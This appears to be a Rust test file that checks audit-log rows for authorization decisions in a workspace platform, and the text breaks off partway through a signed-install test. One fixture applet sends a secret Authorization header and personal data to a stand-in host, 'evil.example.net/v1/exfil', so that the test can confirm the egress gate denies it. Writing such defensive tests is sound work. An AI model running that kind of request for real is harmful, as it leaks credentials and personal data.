//! SC-12 LIVE WIRING: a real authorization denial lands a persisted, queryable
//! `audit_log` row through the production decision path — not a tested-but-
//! disconnected library (the db.watch lesson). These tests drive the PUBLIC
//! [`WorkspaceCore::handle`] / [`WorkspaceCore::sync_with`] surfaces and then
//! read the durable log back through [`forge_storage::Store::query_audit`].
//!
//! The acceptance bar (`forge/spec/audit-log.md`): "a real sync-RBAC /
//! command-RBAC denial lands a persisted, queryable row through the live decision
//! path." Each test makes a denial happen the way the application would, then
//! proves the row is in `audit_log`, queryable by the same filters a security
//! reviewer would use (`decision = deny`, `actor_id = ...`). It also asserts the
//! APPEND-ONLY invariant against the live path: re-running the same denial appends
//! a NEW row (fresh seq/audit_id) and never mutates the prior one.

use forge_core::{source_id_for, TrustedMembership, WorkspaceCore};
use forge_domain::{ActorContext, AppletId, CoreCommand, RequestId, Role, WorkspaceId};
use forge_runtime::{HttpClient, InMemorySecretStore, NetRequest, NetResponse};
use forge_storage::{AuditQuery, IndexManager, Mutation};
use serde_json::{json, Value};

const SENDER_PEER: u64 = 700;
const RECEIVER_PEER: u64 = 800;

fn membership(actor: &str, role: Role, db_write: &[&str]) -> TrustedMembership {
    TrustedMembership {
        actor_id: actor.into(),
        role,
        db_read: vec!["*".into()],
        db_write: db_write.iter().map(|s| s.to_string()).collect(),
        schema_write: false,
    }
}

fn insert(id: &str, fields: Value, at: i64) -> Mutation {
    Mutation::Insert {
        collection: "tasks".into(),
        id: Some(id.into()),
        fields: fields.as_object().unwrap().clone(),
        logical_at: Some(at),
    }
}

/// A sender/receiver pair with distinct Loro peer ids; the receiver trusts the
/// sender exactly as `receiver_trusts` says.
fn cores_with_membership(receiver_trusts: TrustedMembership) -> (WorkspaceCore, WorkspaceCore) {
    let mut sender = WorkspaceCore::in_memory("ws-sender").unwrap();
    let mut receiver = WorkspaceCore::in_memory("ws-receiver").unwrap();
    sender.store_mut().set_crdt_peer_id(SENDER_PEER);
    receiver.store_mut().set_crdt_peer_id(RECEIVER_PEER);
    receiver
        .set_peer_membership(source_id_for(SENDER_PEER), receiver_trusts)
        .unwrap();
    sender
        .set_peer_membership(
            source_id_for(RECEIVER_PEER),
            membership("actor-receiver", Role::Owner, &["*"]),
        )
        .unwrap();
    (sender, receiver)
}

#[test]
fn sync_rbac_denial_persists_queryable_audit_row_through_live_path() {
    // The receiver trusts the sender only as a VIEWER (no write role): a remote
    // record insert MUST be denied by the live SS-7 apply gate.
    let idx = IndexManager::new();
    let (mut sender, mut receiver) =
        cores_with_membership(membership("actor-viewer", Role::Viewer, &[]));

    sender
        .store_mut()
        .apply_mutation_crdt(&insert("task-x", json!({ "title": "viewer write" }), 1), &idx)
        .unwrap();

    // Drive the REAL sync path. The op is denied before import.
    let report = sender.sync_with(&mut receiver).unwrap();
    assert_eq!(report.chunks_denied, 1, "the viewer write is denied");
    assert_eq!(report.chunks_a_to_b, 0, "nothing imported into the receiver");

    // The denial landed a DURABLE row in the receiver's audit_log — queryable by
    // decision exactly as a security reviewer would search it.
    let denies = receiver
        .store()
        .query_audit(&AuditQuery::by_decision("deny"))
        .unwrap();
    assert_eq!(denies.len(), 1, "exactly one persisted deny row: {denies:?}");
    let row = &denies[0];
    assert_eq!(row.producer, "sync-rbac");
    assert_eq!(row.action, "sync.record.insert");
    assert_eq!(row.decision, "deny");
    // The `actor_id` is the TRUSTED membership row's actor (the authenticated
    // identity that decided the op), not the raw `peer:<id>` source — the source
    // is carried in metadata.
    assert_eq!(row.actor_id, "actor-viewer");
    assert_eq!(row.resource_type, "record");
    assert_eq!(row.collection.as_deref(), Some("tasks"));
    assert!(
        row.reason.contains("viewer"),
        "the persisted reason names the viewer role: {}",
        row.reason
    );
    // seq + audit_id are minted by the store (deterministic ordering key).
    assert_eq!(row.seq, 1);
    assert_eq!(row.audit_id, "audit-000001");
    // The metadata carries the TRUSTED grant snapshot + record ids (no secret/body).
    let meta = row.metadata.as_object().unwrap();
    assert_eq!(meta.get("trusted_role").unwrap(), "Viewer");
    assert_eq!(meta.get("record_ids").unwrap(), &json!(["task-x"]));

    // The SENDER's log holds nothing for this op — only the RECEIVER decides/records.
    assert!(
        sender
            .store()
            .query_audit(&AuditQuery::by_decision("deny"))
            .unwrap()
            .is_empty(),
        "the sender records no deny; the receiver owns the apply-boundary decision"
    );
}

#[test]
fn sync_rbac_allow_persists_record_and_audit_row_atomically_via_live_path() {
    // SC-12 review 149: an ALLOWED sync import lands the imported record AND the
    // receiver's `allow` audit row through the live path — and they commit in the SAME
    // receiving-store transaction, so a committed authorization decision ALWAYS has its
    // durable row (no crash window between the import and a separate audit append). This
    // test proves the durability promise positively: after a clean allowed sync, both
    // the record and its allow row are present in the receiver.
    let idx = IndexManager::new();
    let (mut sender, mut receiver) =
        cores_with_membership(membership("actor-editor", Role::Editor, &["tasks"]));

    sender
        .store_mut()
        .apply_mutation_crdt(&insert("task-ok", json!({ "title": "editor write" }), 1), &idx)
        .unwrap();

    let report = sender.sync_with(&mut receiver).unwrap();
    assert_eq!(report.chunks_denied, 0, "the editor write is authorized");
    assert_eq!(report.chunks_a_to_b, 1, "the record imported into the receiver");

    // The imported record materialized in the receiver's projection...
    assert!(
        receiver.store().get_record("tasks", "task-ok").unwrap().is_some(),
        "the authorized record is durable in the receiver"
    );
    // ...AND its `allow` audit row is durable in the receiver's log — the two committed
    // together (the row used to be appended in a SEPARATE post-import transaction).
    let allows = receiver
        .store()
        .query_audit(&AuditQuery::by_decision("allow"))
        .unwrap();
    assert_eq!(allows.len(), 1, "exactly one persisted allow row: {allows:?}");
    let row = &allows[0];
    assert_eq!(row.producer, "sync-rbac");
    assert_eq!(row.action, "sync.record.insert");
    assert_eq!(row.decision, "allow");
    assert_eq!(row.actor_id, "actor-editor");
    assert_eq!(row.collection.as_deref(), Some("tasks"));
    let meta = row.metadata.as_object().unwrap();
    assert_eq!(meta.get("trusted_role").unwrap(), "Editor");
    assert_eq!(meta.get("record_ids").unwrap(), &json!(["task-ok"]));
}

#[test]
fn sync_rbac_denial_is_append_only_across_reruns_via_live_path() {
    // APPEND-ONLY against the LIVE path: re-running the same denied sync appends a
    // NEW row (fresh seq/audit_id) and never mutates the prior one.
    let idx = IndexManager::new();
    let (mut sender, mut receiver) =
        cores_with_membership(membership("actor-viewer", Role::Viewer, &[]));
    sender
        .store_mut()
        .apply_mutation_crdt(&insert("task-x", json!({ "title": "viewer write" }), 1), &idx)
        .unwrap();

    sender.sync_with(&mut receiver).unwrap();
    let first = receiver
        .store()
        .query_audit(&AuditQuery::by_decision("deny"))
        .unwrap();
    assert_eq!(first.len(), 1, "first denial recorded");
    let first_row = first[0].clone();

    // Author a SECOND distinct denied op and sync again. The first chunk was never
    // imported (it was denied), so a second sync RE-OFFERS task-x AND offers the new
    // task-y — both denied — so the receiver APPENDS two more rows. History only ever
    // grows; the prior row is never rewritten.
    sender
        .store_mut()
        .apply_mutation_crdt(&insert("task-y", json!({ "title": "again" }), 2), &idx)
        .unwrap();
    sender.sync_with(&mut receiver).unwrap();

    let after = receiver
        .store()
        .query_audit(&AuditQuery::by_decision("deny"))
        .unwrap();
    assert_eq!(
        after.len(),
        3,
        "the re-run APPENDED rows (re-offered task-x + new task-y), history grew: {after:?}"
    );
    // The prior row is byte-identical — untouched (no UPDATE/DELETE of history).
    assert_eq!(after[0].seq, first_row.seq);
    assert_eq!(after[0].audit_id, first_row.audit_id);
    assert_eq!(after[0].reason, first_row.reason);
    assert_eq!(after[0].metadata, first_row.metadata);
    // Each appended row has a strictly higher seq + distinct audit_id (gap-free).
    assert!(after[1].seq > after[0].seq, "seq strictly increases on append");
    assert!(after[2].seq > after[1].seq, "seq strictly increases on append");
    assert_ne!(after[1].audit_id, after[0].audit_id);
    assert_ne!(after[2].audit_id, after[1].audit_id);
}

#[test]
fn command_rbac_denial_persists_queryable_audit_row_through_live_path() {
    // An Auditor cannot `runtime.run` (read-only/oversight role) — the live CR-A3
    // command-RBAC gate denies it. The denial must land a queryable audit row.
    let mut core = WorkspaceCore::in_memory("ws-cmd").unwrap();
    let cmd = CoreCommand {
        request_id: RequestId::new("req-1"),
        name: "runtime.run".into(),
        applet_id: Some(AppletId::new("applet.notes")),
        actor: ActorContext {
            actor: "actor-auditor-1".into(),
            role: Role::Auditor,
        },
        workspace_id: WorkspaceId::new("ws"),
        payload: json!({}),
    };
    let resp = core.handle(cmd);
    assert!(!resp.ok, "the auditor's runtime.run must be denied");

    // The denial is queryable by ACTOR (the security reviewer's lookup).
    let rows = core
        .store()
        .query_audit(&AuditQuery::by_actor("actor-auditor-1"))
        .unwrap();
    assert_eq!(rows.len(), 1, "exactly one persisted command-rbac deny: {rows:?}");
    let row = &rows[0];
    assert_eq!(row.producer, "command-rbac");
    assert_eq!(row.action, "command.runtime.run");
    assert_eq!(row.decision, "deny");
    assert_eq!(row.actor_id, "actor-auditor-1");
    assert_eq!(row.resource_type, "command");
    assert_eq!(row.resource_id.as_deref(), Some("runtime.run"));
    let meta = row.metadata.as_object().unwrap();
    assert_eq!(meta.get("role").unwrap(), "Auditor");
    assert_eq!(meta.get("command").unwrap(), "runtime.run");
    assert_eq!(meta.get("applet_id").unwrap(), "applet.notes");

    // Cross-check it is ALSO findable by decision=deny (the same row).
    let by_decision = core
        .store()
        .query_audit(&AuditQuery::by_decision("deny"))
        .unwrap();
    assert_eq!(by_decision.len(), 1);
    assert_eq!(by_decision[0].audit_id, row.audit_id);
}

#[test]
fn command_rbac_denial_is_append_only_across_reruns_via_live_path() {
    // Re-issuing the SAME denied command appends a NEW row; the prior is untouched.
    let mut core = WorkspaceCore::in_memory("ws-cmd-append").unwrap();
    let denied = || CoreCommand {
        request_id: RequestId::new("req"),
        name: "applet.install".into(),
        applet_id: Some(AppletId::new("applet.notes")),
        actor: ActorContext {
            actor: "actor-viewer-1".into(),
            role: Role::Viewer,
        },
        workspace_id: WorkspaceId::new("ws"),
        payload: json!({}),
    };
    assert!(!core.handle(denied()).ok, "a viewer cannot install");
    let after_one = core
        .store()
        .query_audit(&AuditQuery::by_actor("actor-viewer-1"))
        .unwrap();
    assert_eq!(after_one.len(), 1);
    let first = after_one[0].clone();

    assert!(!core.handle(denied()).ok, "a viewer still cannot install");
    let after_two = core
        .store()
        .query_audit(&AuditQuery::by_actor("actor-viewer-1"))
        .unwrap();
    assert_eq!(after_two.len(), 2, "the re-run appended a second row");
    // Prior row byte-identical.
    assert_eq!(after_two[0].seq, first.seq);
    assert_eq!(after_two[0].audit_id, first.audit_id);
    // New row strictly later.
    assert!(after_two[1].seq > after_two[0].seq);
    assert_ne!(after_two[1].audit_id, after_two[0].audit_id);
    assert_eq!(after_two[1].action, "command.applet.install");
}

#[test]
fn allowed_command_persists_no_command_rbac_deny_row() {
    // An ALLOWED command does not write a command-RBAC DENY row: only denials are
    // the command-RBAC producer (the live gate writes on the Err(PermissionDenied)
    // branch). This guards against the wiring spuriously logging every command.
    let mut core = WorkspaceCore::in_memory("ws-allow").unwrap();
    let cmd = CoreCommand {
        request_id: RequestId::new("req-ok"),
        name: "workspace.open".into(),
        applet_id: None::<AppletId>,
        actor: ActorContext::owner("dev"),
        workspace_id: WorkspaceId::new("ws"),
        payload: json!({}),
    };
    let resp = core.handle(cmd);
    assert!(resp.ok, "workspace.open is allowed for an owner");
    assert!(
        core.store()
            .query_audit(&AuditQuery::by_decision("deny"))
            .unwrap()
            .is_empty(),
        "an allowed command writes no command-rbac deny row"
    );
}

// ===========================================================================
// The OTHER FIVE producers the audit-log manifest names — secrets, network,
// lifecycle-purge, signing-refusal, permission grant/revoke — must ALSO persist
// through real production code, not only the storage-substrate e2e harness.
// Each test below drives the REAL production path (a `runtime.run` egress, an
// `applet.uninstall`, a failing `applet.install`, the capability-grant admin API)
// and proves the durable row landed, is queryable, redacts secret/body material,
// and re-runs append-only.
// ===========================================================================

/// An owner command envelope, for the install/uninstall paths.
fn owner_cmd(name: &str, applet_id: &str, payload: Value) -> CoreCommand {
    CoreCommand {
        request_id: RequestId::new("req"),
        name: name.into(),
        applet_id: Some(AppletId::new(applet_id)),
        actor: ActorContext::owner("actor-owner-1"),
        workspace_id: WorkspaceId::new("ws"),
        payload,
    }
}

/// A network-free [`HttpClient`] double returning a canned response. Used so the
/// `network.egress` / `secret.use` producers run off a REAL recorded `ctx.net.fetch`
/// trace without ever touching the live network.
#[derive(Clone)]
struct CannedClient {
    response: NetResponse,
}

impl HttpClient for CannedClient {
    fn send(&self, _request: NetRequest) -> forge_domain::Result<NetResponse> {
        Ok(self.response.clone())
    }
}

/// A manifest granting POST egress to `https://api.example.com/*` with a secret
/// `Authorization` header allowed (SC-13), plus ui. The applet only fetches.
fn egress_manifest() -> Value {
    json!({
        "entrypoint": "src/main.ts",
        "min_api": "forge-api@0.1",
        "deterministic": true,
        "capabilities": {
            "storage": { "read": [], "write": [] },
            "db": { "read": [], "write": [] },
            "ui": true,
            "net": [
                { "method": "POST", "url": "https://api.example.com/*",
                  "request_content_types": ["application/json"],
                  "response_content_types": ["application/json"],
                  "allow_secret_headers": ["Authorization"] }
            ]
        },
        "limits": {
            "wall_ms": 3000, "fuel": 10000000, "memory_bytes": 67108864,
            "max_host_calls": 10000, "storage_bytes": 10485760, "log_bytes": 262144
        }
    })
}

/// An applet that POSTs a lead with a SECRET-REF Authorization header and a request
/// body. The resolved secret value is injected only at the HTTP edge, so the trace
/// keeps only the `secret_ref`; the body is opaque.
const EGRESS_TS: &str = r#"
    export async function main(ctx: any, input: any): Promise<any> {
        const resp = await ctx.net.fetch({
            method: "POST",
            url: "https://api.example.com/v1/leads",
            contentType: "application/json",
            headers: { "Authorization": { secret_ref: "secret_crm" } },
            body: JSON.stringify({ name: "Ada", email: "ada@example.com" })
        });
        return { ok: true, value: { status: resp.status } };
    }
"#;

/// Install + run the egress applet through the REAL `applet.install` / `runtime.run`
/// command path with an injected canned client + secret store, returning the core.
fn run_egress_applet() -> WorkspaceCore {
    let mut core = WorkspaceCore::in_memory("ws-egress").unwrap();
    let response = NetResponse {
        status: 201,
        body: Some(r#"{"id":"lead-1"}"#.to_string()),
        content_type: Some("application/json".to_string()),
        ..Default::default()
    };
    core.set_http_client_factory(move || Box::new(CannedClient { response: response.clone() }));
    // The resolved secret value lives ONLY in the injected store; the trace + audit
    // metadata must never carry it (SC-13 / SC-12 redaction).
    core.set_secret_store_factory(|| {
        Box::new(InMemorySecretStore::from_pairs([("secret_crm", "Bearer super-secret-token")]))
    });

    let install = core.handle(owner_cmd(
        "applet.install",
        "app.crm",
        json!({ "manifest": egress_manifest(), "sources": { "src/main.ts": EGRESS_TS } }),
    ));
    assert!(install.ok, "install must succeed: {:?}", install.error);
    let run = core.handle(owner_cmd("runtime.run", "app.crm", json!({ "input": {} })));
    assert!(run.ok, "run must succeed: {:?}", run.error);
    core
}

/// Like [`run_egress_applet`] but ALSO returns the `run_id` the live `runtime.run`
/// minted, so a test can prove the run record AND its egress audit rows committed
/// together (FIX ROUND 2 P2 atomicity).
fn run_egress_applet_with_run_id() -> (WorkspaceCore, String) {
    let mut core = WorkspaceCore::in_memory("ws-egress-atomic").unwrap();
    let response = NetResponse {
        status: 201,
        body: Some(r#"{"id":"lead-1"}"#.to_string()),
        content_type: Some("application/json".to_string()),
        ..Default::default()
    };
    core.set_http_client_factory(move || Box::new(CannedClient { response: response.clone() }));
    core.set_secret_store_factory(|| {
        Box::new(InMemorySecretStore::from_pairs([("secret_crm", "Bearer super-secret-token")]))
    });
    let install = core.handle(owner_cmd(
        "applet.install",
        "app.crm",
        json!({ "manifest": egress_manifest(), "sources": { "src/main.ts": EGRESS_TS } }),
    ));
    assert!(install.ok, "install must succeed: {:?}", install.error);
    let run = core.handle(owner_cmd("runtime.run", "app.crm", json!({ "input": {} })));
    assert!(run.ok, "run must succeed: {:?}", run.error);
    let run_id = run.payload["run_id"].as_str().unwrap().to_string();
    (core, run_id)
}

#[test]
fn network_egress_persists_queryable_audit_row_through_live_run() {
    // A REAL `runtime.run` whose applet `ctx.net.fetch`-es lands a durable
    // `network.egress` audit row derived from the recorded host-call trace.
    let core = run_egress_applet();
    let rows = core
        .store()
        .query_audit(&AuditQuery::by_resource_type("network"))
        .unwrap();
    assert_eq!(rows.len(), 1, "exactly one network.egress row: {rows:?}");
    let row = &rows[0];
    assert_eq!(row.producer, "net");
    assert_eq!(row.action, "network.egress");
    assert_eq!(row.decision, "allow");
    assert_eq!(row.actor_id, "actor-owner-1");
    assert_eq!(row.resource_id.as_deref(), Some("https://api.example.com"));
    let meta = row.metadata.as_object().unwrap();
    assert_eq!(meta.get("method").unwrap(), "POST");
    assert_eq!(meta.get("scheme").unwrap(), "https");
    assert_eq!(meta.get("host").unwrap(), "api.example.com");
    assert_eq!(meta.get("path").unwrap(), "/v1/leads");
    assert_eq!(meta.get("status").unwrap(), 201);
    // REDACTION: bodies are NEVER persisted — only the redaction markers remain.
    assert!(!meta.contains_key("request_body"), "request body dropped");
    assert!(!meta.contains_key("response_body"), "response body dropped");
    assert_eq!(meta.get("request_body_redacted").unwrap(), &json!(true));
    assert_eq!(meta.get("response_body_redacted").unwrap(), &json!(true));
    // The body PII never appears anywhere in the persisted bytes.
    let raw = serde_json::to_string(&row.metadata).unwrap();
    for leak in ["Ada", "ada@example.com", "lead-1"] {
        assert!(!raw.contains(leak), "egress row leaks {leak}: {raw}");
    }
}

#[test]
fn secret_use_persists_redacted_audit_row_through_live_run() {
    // The same real run resolved a `secret_ref` Authorization header → a durable
    // `secret.use` audit row carrying ONLY the secret_ref, never the value.
    let core = run_egress_applet();
    let rows = core
        .store()
        .query_audit(&AuditQuery::by_action("secret.use"))
        .unwrap();
    assert_eq!(rows.len(), 1, "exactly one secret.use row: {rows:?}");
    let row = &rows[0];
    assert_eq!(row.producer, "secrets");
    assert_eq!(row.decision, "allow");
    assert_eq!(row.actor_id, "actor-owner-1");
    assert_eq!(row.resource_type, "secret");
    assert_eq!(row.resource_id.as_deref(), Some("secret_crm"));
    let meta = row.metadata.as_object().unwrap();
    assert_eq!(meta.get("secret_ref").unwrap(), "secret_crm");
    assert_eq!(meta.get("target_host").unwrap(), "api.example.com");
    assert_eq!(meta.get("target_header").unwrap(), "Authorization");
    assert_eq!(meta.get("value_redacted").unwrap(), &json!(true));
    // REDACTION: the resolved secret value never appears in ANY persisted row.
    let all = core.store().query_audit(&AuditQuery::default()).unwrap();
    let raw: String = all
        .iter()
        .map(|r| serde_json::to_string(&r.metadata).unwrap())
        .collect::<Vec<_>>()
        .join("\n");
    for leak in ["Bearer super-secret-token", "super-secret-token"] {
        assert!(!raw.contains(leak), "a persisted audit row leaks the secret: {raw}");
    }
}

/// An applet whose `ctx.net.fetch` targets a host the manifest does NOT allowlist,
/// while carrying a `secret_ref` Authorization header. The SC-5 egress gate DENIES
/// the request before it reaches the client (host mismatch), and the SC-13 secret is
/// NEVER resolved. The applet catches the error so the run still completes — what
/// matters is the recorded denial in the trace, not the run's success.
const DENIED_EGRESS_TS: &str = r#"
    export async function main(ctx: any, input: any): Promise<any> {
        try {
            await ctx.net.fetch({
                method: "POST",
                url: "https://evil.example.net/v1/exfil",
                contentType: "application/json",
                headers: { "Authorization": { secret_ref: "secret_crm" } },
                body: JSON.stringify({ name: "Ada", email: "ada@example.com" })
            });
            return { ok: true, value: { sent: true } };
        } catch (e) {
            return { ok: true, value: { sent: false } };
        }
    }
"#;

#[test]
fn denied_egress_persists_deny_row_and_no_allow_rows_through_live_run() {
    // Review 151 (deny classification): a `ctx.net.fetch` the SC-5 egress policy
    // DENIES is recorded as `{"denied": <CoreError>}` — it never reached the network
    // and was never approved. The live `persist_run_egress_audit` must therefore:
    //   * emit NO `allow` `network.egress` row,
    //   * emit NO `allow` `secret.use` row (even though the request carried a
    //     `secret_ref` Authorization header — no secret was resolved),
    //   * emit a SINGLE `network.egress` `deny` row carrying the denial reason.
    // A forbidden egress with a secret header must be auditable AS a denial, never
    // persisted as an approval.
    let mut core = WorkspaceCore::in_memory("ws-egress-deny").unwrap();
    // A client that would PANIC the test if it were ever reached — the denial must
    // short-circuit before the bridge, so this canned response is never served.
    let response = NetResponse {
        status: 200,
        body: Some(r#"{"ok":true}"#.to_string()),
        content_type: Some("application/json".to_string()),
        ..Default::default()
    };
    core.set_http_client_factory(move || Box::new(CannedClient { response: response.clone() }));
    core.set_secret_store_factory(|| {
        Box::new(InMemorySecretStore::from_pairs([("secret_crm", "Bearer super-secret-token")]))
    });

    // The manifest allowlists ONLY api.example.com; the applet fetches evil.example.net.
    let install = core.handle(owner_cmd(
        "applet.install",
        "app.crm",
        json!({ "manifest": egress_manifest(), "sources": { "src/main.ts": DENIED_EGRESS_TS } }),
    ));
    assert!(install.ok, "install must succeed: {:?}", install.error);
    let run = core.handle(owner_cmd("runtime.run", "app.crm", json!({ "input": {} })));
    assert!(run.ok, "run completes (the applet caught the denial): {:?}", run.error);

    // NO allow network.egress row was written for the denied fetch.
    let allow_egress = core
        .store()
        .query_audit(&AuditQuery::by_action("network.egress"))
        .unwrap()
        .into_iter()
        .filter(|r| r.decision == "allow")
        .count();
    assert_eq!(allow_egress, 0, "a denied fetch must NOT mint an allow network.egress row");

    // NO secret.use row at all — the secret was never resolved on a denied fetch.
    let secret_rows = core
        .store()
        .query_audit(&AuditQuery::by_action("secret.use"))
        .unwrap();
    assert!(
        secret_rows.is_empty(),
        "a denied fetch must NOT mint a secret.use row: {secret_rows:?}"
    );

    // Exactly ONE network.egress DENY row, carrying the denial reason + safe metadata.
    let deny_rows = core
        .store()
        .query_audit(&AuditQuery::by_decision("deny"))
        .unwrap();
    assert_eq!(deny_rows.len(), 1, "exactly one persisted deny row: {deny_rows:?}");
    let row = &deny_rows[0];
    assert_eq!(row.producer, "net");
    assert_eq!(row.action, "network.egress");
    assert_eq!(row.decision, "deny");
    assert_eq!(row.actor_id, "actor-owner-1");
    assert_eq!(row.resource_type, "network");
    assert_eq!(row.resource_id.as_deref(), Some("https://evil.example.net"));
    // The reason names the denial; metadata carries method/host/path but NO status
    // (the fetch never returned) and NO body.
    assert!(
        row.reason.to_lowercase().contains("denied") || row.reason.contains("PermissionDenied"),
        "the deny row carries the denial reason: {}",
        row.reason
    );
    let meta = row.metadata.as_object().unwrap();
    assert_eq!(meta.get("method").unwrap(), "POST");
    assert_eq!(meta.get("host").unwrap(), "evil.example.net");
    assert!(!meta.contains_key("status"), "a denied fetch has no served status");

    // REDACTION: neither the secret value nor the request body PII appears in ANY row.
    let all = core.store().query_audit(&AuditQuery::default()).unwrap();
    let raw: String = all
        .iter()
        .map(|r| format!("{}\n{}", r.reason, serde_json::to_string(&r.metadata).unwrap()))
        .collect::<Vec<_>>()
        .join("\n");
    for leak in ["super-secret-token", "Ada", "ada@example.com"] {
        assert!(!raw.contains(leak), "a denied-egress audit row leaks {leak}: {raw}");
    }
}

#[test]
fn lifecycle_purge_persists_queryable_audit_row_through_live_uninstall() {
    // A REAL `applet.uninstall` with `purge_data` lands a durable `applet.uninstalled`
    // audit row through the live command path.
    let mut core = WorkspaceCore::in_memory("ws-uninstall").unwrap();
    let manifest = json!({
        "entrypoint": "src/main.ts",
        "min_api": "forge-api@0.1",
        "deterministic": true,
        "capabilities": {
            "storage": { "read": [], "write": [] },
            "db": { "read": ["tasks"], "write": ["tasks"] },
            "ui": true
        },
        "limits": {
            "wall_ms": 3000, "fuel": 10000000, "memory_bytes": 67108864,
            "max_host_calls": 10000, "storage_bytes": 10485760, "log_bytes": 262144
        }
    });
    let install = core.handle(owner_cmd(
        "applet.install",
        "applet.todo",
        json!({ "manifest": manifest, "sources": { "src/main.ts": "export async function main(ctx:any,input:any){ return { ok:true }; }" } }),
    ));
    assert!(install.ok, "install must succeed: {:?}", install.error);

    let uninstall = core.handle(owner_cmd(
        "applet.uninstall",
        "applet.todo",
        json!({ "applet_id": "applet.todo", "retention_policy": "purge_data" }),
    ));
    assert!(uninstall.ok, "uninstall must succeed: {:?}", uninstall.error);

    let rows = core
        .store()
        .query_audit(&AuditQuery::by_action("applet.uninstalled"))
        .unwrap();
    assert_eq!(rows.len(), 1, "exactly one lifecycle purge row: {rows:?}");
    let row = &rows[0];
    assert_eq!(row.producer, "lifecycle");
    assert_eq!(row.decision, "allow");
    assert_eq!(row.actor_id, "actor-owner-1");
    assert_eq!(row.resource_type, "applet");
    assert_eq!(row.resource_id.as_deref(), Some("applet.todo"));
    let meta = row.metadata.as_object().unwrap();
    assert_eq!(meta.get("retention_policy").unwrap(), "purge_data");
    assert_eq!(meta.get("tombstone_reason").unwrap(), "applet.uninstall:purge_data");
    assert_eq!(meta.get("run_records_retained").unwrap(), &json!(true));
}

#[test]
fn purge_uninstall_rollback_leaves_no_audit_row_atomicity() {
    // FIX ROUND 2 (P1 atomicity, spec/audit-log.md §2): the `applet.uninstalled`
    // audit row must commit in the SAME `Store::transact` as the tombstone writes +
    // active-pointer removal. A purge-uninstall whose tombstone txn is FORCED to roll
    // back (`simulate_failure_stage: "uninstall.tombstone"`) must therefore leave NO
    // audit row of the purge — proving the row would have ridden the same rolled-back
    // transaction, not a separate append that could have committed independently.
    let mut core = WorkspaceCore::in_memory("ws-uninstall-rollback").unwrap();
    let manifest = json!({
        "entrypoint": "src/main.ts",
        "min_api": "forge-api@0.1",
        "deterministic": true,
        "capabilities": {
            "storage": { "read": [], "write": [] },
            "db": { "read": ["tasks"], "write": ["tasks"] },
            "ui": true
        },
        "limits": {
            "wall_ms": 3000, "fuel": 10000000, "memory_bytes": 67108864,
            "max_host_calls": 10000, "storage_bytes": 10485760, "log_bytes": 262144
        }
    });
    let install = core.handle(owner_cmd(
        "applet.install",
        "applet.todo",
        json!({ "manifest": manifest, "sources": { "src/main.ts": "export async function main(ctx:any,input:any){ return { ok:true }; }" } }),
    ));
    assert!(install.ok, "install must succeed: {:?}", install.error);
    // One live applet-owned record so the purge has a tombstone to (try to) write.
    let env = forge_domain::RecordEnvelope::new(
        forge_domain::CollectionId::new("tasks"),
        forge_domain::RecordId::new("tasks/1"),
        [("title".to_string(), json!("one"))].into_iter().collect(),
        forge_domain::LogicalTimestamp(1),
    );
    core.store_mut().put_record(&env).unwrap();

    let seq_before = core.store().highest_audit_seq().unwrap();

    // Force the purge transaction to roll back mid-uninstall.
    let uninstall = core.handle(owner_cmd(
        "applet.uninstall",
        "applet.todo",
        json!({ "retention_policy": "purge_data", "simulate_failure_stage": "uninstall.tombstone" }),
    ));
    assert!(!uninstall.ok, "the forced mid-uninstall failure must fail the uninstall");

    // ATOMICITY: the rolled-back purge committed NO `applet.uninstalled` audit row...
    let rows = core
        .store()
        .query_audit(&AuditQuery::by_action("applet.uninstalled"))
        .unwrap();
    assert!(
        rows.is_empty(),
        "a rolled-back purge must leave NO applet.uninstalled audit row: {rows:?}"
    );
    // ...and did not advance the audit seq counter (no row was assigned a seq).
    assert_eq!(
        core.store().highest_audit_seq().unwrap(),
        seq_before,
        "a rolled-back purge must not bump the audit seq (no row landed)"
    );
    // And the record stays live (the tombstone rolled back with the audit append).
    let rec = core.store().get_record("tasks", "tasks/1").unwrap().expect("record retained");
    assert!(!rec.deleted, "the record stays live — the whole purge rolled back atomically");

    // A clean purge AFTER the rolled-back attempt still lands its audit row (the
    // failed txn left no poison), proving the same-txn append is the steady-state path.
    let ok = core.handle(owner_cmd(
        "applet.uninstall",
        "applet.todo",
        json!({ "retention_policy": "purge_data" }),
    ));
    assert!(ok.ok, "a clean purge after the rolled-back one succeeds: {:?}", ok.error);
    let after = core
        .store()
        .query_audit(&AuditQuery::by_action("applet.uninstalled"))
        .unwrap();
    assert_eq!(after.len(), 1, "the clean purge lands exactly one audit row: {after:?}");
    assert!(
        core.store().highest_audit_seq().unwrap() > seq_before,
        "the clean purge's audit row advanced the seq counter"
    );
}

#[test]
fn run_egress_audit_rows_commit_atomically_with_the_run_record() {
    // FIX ROUND 2 (P2 atomicity, spec/audit-log.md §2): the `allow` `network.egress` /
    // `secret.use` rows for a served egress commit in the SAME `Store::transact` as
    // the run record (`save_run_tx` + `append_audit_tx`). A served egress (the durable
    // effect) can never be persisted without its audit trail — so the run record AND
    // both egress rows are durable together after one live `runtime.run`.
    let (core, run_id) = run_egress_applet_with_run_id();

    // The run record is durable (the run committed)...
    let run = core
        .store()
        .load_run(&run_id)
        .unwrap()
        .expect("the run record committed");
    // ...and it issued exactly one net.fetch (the egress whose rows must ride with it).
    let fetches = run.calls.iter().filter(|c| c.method == "net.fetch").count();
    assert_eq!(fetches, 1, "the egress applet issues exactly one net.fetch");

    // BOTH the `allow` network.egress row AND the secret.use row are durable — they
    // committed in the same transaction as the run record above.
    let egress = core
        .store()
        .query_audit(&AuditQuery::by_action("network.egress"))
        .unwrap();
    assert_eq!(egress.len(), 1, "exactly one network.egress row: {egress:?}");
    assert_eq!(egress[0].decision, "allow");
    let secret = core
        .store()
        .query_audit(&AuditQuery::by_action("secret.use"))
        .unwrap();
    assert_eq!(secret.len(), 1, "exactly one secret.use row: {secret:?}");
    assert_eq!(secret[0].decision, "allow");
    // Both rows share the run's actor — they are the egress THIS run produced.
    assert_eq!(egress[0].actor_id, "actor-owner-1");
    assert_eq!(secret[0].actor_id, "actor-owner-1");
}

#[test]
fn signed_install_refusal_persists_queryable_audit_row_through_live_install() {
    // A REAL `applet.install` whose signature verification REJECTS lands a durable
    // `package.install.refused` deny row through the live install path. The signature
    // is structurally malformed so verification fails fail-closed before any state is
    // written; the install payload carries the signer provenance + refusal context the
    // audit row records.
    let mut core = WorkspaceCore::in_memory("ws-signing").unwrap();
    let manifest = json!({
        "entrypoint": "src/main.ts",
        "min_api": "forge-api@0.1",
        "deterministic": true,
        "capabilities": { "storage": { "read": [], "write": [] }, "db": { "read": [], "write": [] }, "ui": true },
